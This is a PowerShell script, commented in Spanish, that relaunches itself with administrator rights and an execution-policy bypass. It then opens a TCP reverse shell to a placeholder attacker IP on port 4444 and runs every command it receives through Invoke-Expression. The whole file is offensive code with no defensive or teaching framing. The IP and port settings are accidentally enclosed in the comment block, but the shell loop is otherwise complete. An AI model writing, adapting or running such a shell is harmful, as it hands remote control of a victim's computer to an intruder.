<#
.SYNOPSIS
  Escala a administrador y abre un reverse shell TCP.

# Configura tu listener IP y puerto aquí:
$IP   = "TU_IP_AQUI"
$Port = 4444
#>

Write-Host "[*] Comprobando privilegios actuales..."
# Si no es admin, relanzamos con RunAs
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
           ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {

    Write-Host "[*] Elevando privilegios..."
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy Bypass",
        "-Command & {`"$PSCommandPath`"}"
    )
    exit
}

Write-Host "[*] Sesión elevada. Abriendo reverse shell a $IP:$Port..."

# Crear cliente TCP
$client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$encoding = New-Object System.Text.ASCIIEncoding
$buffer = New-Object byte[] 1024

# Loop de recepción de comandos
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $bytesRead)
    try {
        $output = Invoke-Expression $data 2>&1 | Out-String
    } catch {
        $output = "Error ejecutando comando: $_"
    }
    $response = $output + "PS " + (Get-Location).Path + "> "
    $writer.Write($response)
    $writer.Flush()
}

# Cerrar conexiones
$writer.Close()
$stream.Close()
$client.Close()